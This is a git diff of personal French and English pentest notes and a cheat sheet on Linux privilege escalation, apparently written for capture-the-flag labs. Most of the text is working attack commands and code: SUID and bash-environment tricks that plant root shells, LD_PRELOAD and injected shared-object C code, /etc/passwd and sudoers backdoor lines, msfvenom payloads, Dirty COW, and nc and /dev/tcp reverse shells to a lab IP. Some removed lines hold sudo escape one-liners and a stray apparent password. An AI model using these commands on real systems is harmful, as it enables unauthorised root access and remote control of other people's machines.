@@ -22,23 +22,28 @@ $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/nul
 then search suspect SUID in GTFOBINS
 
 
-### known exploits : 
+### KNOWN EXPLOIT : 
 looking for the exploit in exploit-db.com or google ...
 
 
 ### ABUSING SHELL FEATURES : 
-context : The  executable is identical to /usr/local/bin/suid-env 
-except that it uses the absolute path of the service executable (/usr/sbin/service) to start the 
-apache2 webserver.
+context : The  executable is identical to /usr/local/bin/suid-env  
+except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.  
+```bash
 $ /bin/bash --version -> verify the version is under 4.2-048
+```
+```bash
 $ function /usr/sbin/service { /bin/bash -p; }
 $ export -f /usr/sbin/service
 $ /usr/local/bin/suid-env2
-ABUSING SHELL FEATURE #2
-(will not work on bash version 4.4 and above)
-(vuln with debugging bash enabled)
+```
+### ABUSING SHELL FEATURE #2
+(will not work on bash version 4.4 and above)  
+(vuln with debugging bash enabled)  
+```bash
 $ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env
 $ /tmp/rootbash -p
+```
 
 
 ### WRITEABLE /ETC/PASSWD
@@ -52,8 +57,8 @@ ou
 ou juste : $ openssl passwd [newpassword]
 ```
 
-FORMAT PASSWD :
-test:x:0:0:root:/root:/bin/bash  
+***FORMAT PASSWD :***
+***test:x:0:0:root:/root:/bin/bash ***
 [as divided by colon (:)]  
 Username: It is used when user logs in. It should be between 1 and 32 characters in length.  
 Password: An x character indicates that encrypted password is stored in /etc/shadow file. sha512  
@@ -103,7 +108,7 @@ For Example :
 17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
 
 ### WRITEABLE CRON JOBS :
-#### Exemple :
+### Exemple :
 ##### REVERSE SHELL :
 on écrit l'imitation du file et on setup un listener (en ayant remplacer l'ip et le port:
 ```bash
@@ -138,12 +143,12 @@ wait till it executes
 
 
 ### TAR COMMAND 
-Si dans un cron job une commande comme tar est run avec * 
-alors elle incluera tous els fichiers selectionnés lors de l'exec.
-Si les noms des fichiers sont des options de commande correct alors 
-on peut executer d'autres fichiers.
-donc : 
-quand on cat le fichier on lit blabla tar* :
+Si dans un cron job une commande comme tar est run avec *   
+alors elle incluera tous els fichiers selectionnés lors de l'exec.  
+Si les noms des fichiers sont des options de commande correct alors   
+on peut executer d'autres fichiers.  
+donc :   
+***quand on cat le fichier on lit blabla tar '*' :**
 $ cat /usr/local/bin/compress.sh
 REVERSE root SHELL
 on créee un payload qu'on envoie avec un serv python ou en copier coller (en php par ex):
@@ -172,42 +177,62 @@ On se déplace dans /tmp et on crée un fichier du même nom avec le script deda
 echo $PATH
 ```
 On commence par cree le faux script
+```bash
 $ cd /tmp
 $echo "[whatever command we want to run]" > [name of the executable we're imitating] 
-exemple : echo "/bin/bash" > ls
+```
+
+***exemple : ***
+```bash
+echo "/bin/bash" > ls
 $chmod +x filename	-> x rend le fichier executable
 $export PATH=/tmp:$PATH -> on met /tmp dans le PATH
+```
 
 et on réexecute le file
 
-- MOT DE PASSE ACCIDENTELLEMENT TAPÉ :
-- si un user à accidentellement tapé un mot de passe dans une vraie ligne :
+### MOT DE PASSE ACCIDENTELLEMENT TAPÉ :
+si un user à accidentellement tapé un mot de passe dans une vraie ligne :
 c'est rangé dans $ history ou :
+```bash
 $ cat ~/.*history | less
+```
 
-- CONFIG FILES : (.ovpn par exemple)
-Ils ne contiennent pas le mot de passe mais l'emplacement d'un autre fichier
+### CONFIG FILES : (.ovpn par exemple)
+Ils ne contiennent pas le mot de passe mais peuvent contenir l'emplacement des fichiers qui les contiennent
 
-- SSH PRIVATE KEY :
-Admitting get the id_rsa :
-copy it in attacking machine
+### SSH PRIVATE KEY :
+Suppose that you found the id_rsa file of a remote user
+- copy it in the local machine
+```bash
 chmod 600 id_rsa
 ssh -i id_rsa username@ipaddress
-- NFS root_squashing
+```
+
+### NFS root_squashing
+```
 $ cat /etc/exports -> ici on avait trouvé no_root_squash
+```
 sur notre machine :
 on doit run en tant que root donc : 
+```bash
 $ sudo su
 $ mkdir /tmp/nfs
 $ mount -o rw,vers=2 <targetIP>:/tmp /tmp/nfs
+```
 on crée un payload qui pop un simple bash
+```bash
 $ msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
 $ chmod +x /tmp/nfs/shell.elf
+```
 Sur la target :
+```bash
 msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf4
+```
 
-- LD_PRELOAD : 
+### LD_PRELOAD : 
 1. Open a text editor and type:
+```c
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
@@ -218,25 +243,30 @@ setgid(0);
 setuid(0);
 system("/bin/bash");
 }
+```
 2. Save the file as x.c
 3. In command prompt type:
+```bash
 gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
-4. In command prompt type:
 sudo LD_PRELOAD=/tmp/x.so apache2
-5. In command prompt type: id
+```
 
-- SUID/SGID SHARED OBJECTS INJECTION
+### SUID/SGID SHARED OBJECTS INJECTION
 ( On cherche les SUID qu'il manque pour les recreer )
+```bash
 └─$ strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
+```
 From the output, notice that a .so file is missing from a writable directory.
-.so is compiled .c
-output example : 
-...
-open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
-...
-Donc, on va recreer le SUID car on a remarqué qu'on pouvait écrire dans /home/user/
-nano /home/user/.config/libcalc.c
+***.so is compiled .c***
+##### Output example : 
 
+open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
+
+Donc, on va recreer le SUID car on a remarqué qu'on pouvait écrire dans /home/user/  
+```bash
+nano /home/user/.config/libcalc.c  
+```
+```c
 #include <stdio.h>
 #include <stdlib.h>
 
@@ -245,42 +275,58 @@ static void inject() __attribute__((constructor));
 void inject() {
 system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
 }
-
-on compile : 
+```
+on compile et on execute: 
+```bash
 gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
-
-on execute :
 /usr/local/bin/suid-so
-- SUID SYMLINK
-dpkg -l | grep nginx
-From the output, notice that the installed nginx version is below 1.6.2-5+deb8u3
-For this exploit, it is required that the user be www-data
-/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
-At this stage, the system waits for logrotate to execute (THIS CAN BE LONG)
+```
 
-- SUID/SGID EVIRONNEMENT VARIABLE
+### SUID SYMLINK
+```bash
+dpkg -l | grep nginx
+```
+From the output, notice that the installed nginx version is below 1.6.2-5+deb8u3  
+For this exploit, it is required that the user be www-data  
+/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log  
+At this stage, the system waits for logrotate to execute (THIS CAN BE LONG)  
+
+### SUID/SGID EVIRONNEMENT VARIABLE
+```
 sudo -l / output suid-env
 echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
 gcc /tmp/service.c -o /tmp/service
 export PATH=/tmp:$PATH
 /usr/local/bin/suid-env
-
+```
+```bash
 sudo -l / output suid-env2
 env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
-- KERNEL EXPLOIT :
-1 ) run the linux exploit suggester_pl 
-$ perl PATH/SCRIPT.PL
-2 ) use the desired vuln : here dirty cow
+```
+
+### KERNEL EXPLOIT :
+1 ) run the linux exploit suggester_pl   
+$ perl PATH/SCRIPT.PL  
+2 ) use the desired vuln : here dirty cow  
 compile :
+```bash
 $ gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
+```
 run and let it finish : 
+```
 $ ./c0w	
 $ /usr/bin/passwd	-> allow to gain te root shell
-- CAPABILITIES
+```
+### CAPABILITIES
+```bash
 getcap -r / 2>/dev/null
-From the output, notice the value of the “cap_setuid” capability.
-Example : /usr/bin/python2.6 = cap_setuid+ep
+```
+From the output, notice the value of the “cap_setuid” capability.  
+#### Example : 
+/usr/bin/python2.6 = cap_setuid+ep
+```bash
 /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
 
 
 Les endroits où faire des recherches:
@@ -291,99 +337,117 @@ https://payatu.com/guide-linux-privilege-escalation
 
 
 
+# CHEATSHEET 
 
-ENUMERATION :
-nmap -p- -vv -sV 
+### ENUMERATION :
+```bash
+nmap -p- -vv -sV IP
+```
 
 
-HTTP SERVER
+### SERVER WEB
+```bash
 gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x txt,php,html,js -u http://10.10.245.130
+```
 
-SMB (139 445)
+### SMB (139 445)
+```bash
 $ enum4linux IP
 $ smbclient //IP//Share
-(bruteforce)
+```
 
-FTP
-(anonymous login)
+
+### FTP
+***(anonymous login)***  
 writeable files ?
 $ get <filename>
 
-WEB
-Look for commentary (even in default page)
-enumerate (gobuster)
-look for login form (Bruteforce)
-Commentary form (XSS)
+### WEB
+Look for commentary (even in default page)  
+enumerate (gobuster)  
+look for login form (Bruteforce)  
+Commentary form (XSS)  
 
 
-PRIVESC
+## PRIVESC
+```bash
 sudo -l (certains fichiers sont peut être modifiables ? $PATH ? Verify owner)
-Droits sur /etc/passwd 
+```
+#### /etc/passwd
+- Droits sur /etc/passwd 
+```bash
 openssl passwd newpasswordhere
-test:x:0:0:root:/root:/bin/bash
+```
+test:x:0:0:root:/root:/bin/bash  
+### /etc/shadow
 Droits sur /etc/shadow (hash pour "hashcat")
+```bash
 mkpasswd -m sha-512 newpasswordhere
+```
 user:$6$K9AELjcE4suxukCp$vNLveaks59l46HZOT5TCaxMa1xI6agxYmAFE9CMWCY9/LtBWhzlKM6k4ivhCCntbtFB/Exh3SifcOP9UZ2SIS.:19328:0:99999:7:::
-Droits sur /etc/sudoers
-user ALL = (root) NOPASSWD: ALL
-Droits sur /etc/group
+### /etc/sudoers
+```bash 
+sudo -l 
+```
+- Droits sur /etc/sudoers  
+***user ALL = (root) NOPASSWD: ALL***
+### /etc/group
+- Droits sur /etc/group  
 append user at end of root:x:0:<UTILISATEUR>
-SUID
+### SUID : GTFObins
+```bash
 find / -perm -u=s -type f 2>/dev/null
-GTFObins
-PATH Variable
-ssh private key
-mots de passes accidentellement tapés (history)
-Cronjobs
-Look for stuff in config files (important in CMS)
-Look for kernel exploit (exploit-suggester.pl)
+```
+
+### PATH Variable
+### ssh private key
+### mots de passes accidentellement tapés (history)
+### Cronjobs
+### Look for stuff in config files (important in CMS)
+### Look for kernel exploit (exploit-suggester.pl)
 
 
-REVERSE SHELL NON INTERACTIVE SHELL
-BASH :
+### REVERSE SHELL NON INTERACTIVE SHELL
+```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.3.225 1234 >/tmp/f
 bash -i >& /dev/tcp/10.11.3.225/1234 0>&1
+```
 
 
-STABILISER UN REVERSE SHELL
+### STABILISER UN REVERSE SHELL
+```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'; 
 export TERM=xterm ; export SHELL=bash
+```
 
-COMMAND LINE CHEATSHEET
-Upload to SSH
-└─$ scp [filename] [username]@[IP of remote machine ]:[directory to upload to on remote machine]
-Download from SSH
-└─$ scp remoteuser@remoteIP:path/to/remote/file localdir/
-AES Encryt
-└─$ gpg --cipher-algo [encryption type] [encryption method] [file to encrypt]
-└─$ gpg --cipher-alogo AES-256 --symmetric secret.txt
-Connect to MYSQL remote server
-└─$ mysql -u [username] -p -h [host ip]
+## COMMAND LINE CHEATSHEET
+##### Upload to SSH
+```bash
+scp [filename] [username]@[IP of remote machine ]:[directory to upload to on remote machine]
+```
+##### Download from SSH
+```bash
+scp remoteuser@remoteIP:path/to/remote/file localdir/
+```
+##### AES Encryt
+```bash
+gpg --cipher-algo [encryption type] [encryption method] [file to encrypt]
+gpg --cipher-algo AES-256 --symmetric secret.txt
+```
+##### Connect to MYSQL remote server
+```bash
+mysql -u [username] -p -h [host ip]
+```
 View a .sql file (depuis mysql) /!\ il fait être dans le dosser du fichier
-└─$ source file.sql
+```bash
+source file.sql
+```
 
 
-SQL CHEATSHEET :
+## SQL CHEATSHEET :
+```sql
 SHOW DATABASES;
 USE db_name;
 SHOW TABLES;
 DESCRIBE table_name;
-
-
-
-
-sudo -u silvio zip $TF /etc/hosts -T -TT 'sh #'
-sudo -u reza PAGER='sh -c "exec sh 0<&1"' git -p help
-
-echo "import pty;pty.spawn('/bin/bash')" > /tmp/shop/shop.py
-
-sudo -u jordan PYTHONPATH=/tmp/shop/ /opt/scripts/Gun-Shop.py
-
-sudo -u ken less /etc/profile
-
-sudo -u sean vim -c ':!/bin/sh'
-
-
-find 2>/dev/null | grep -iRlr 'sean' 2> /dev/null
-
-p3nelope
+```
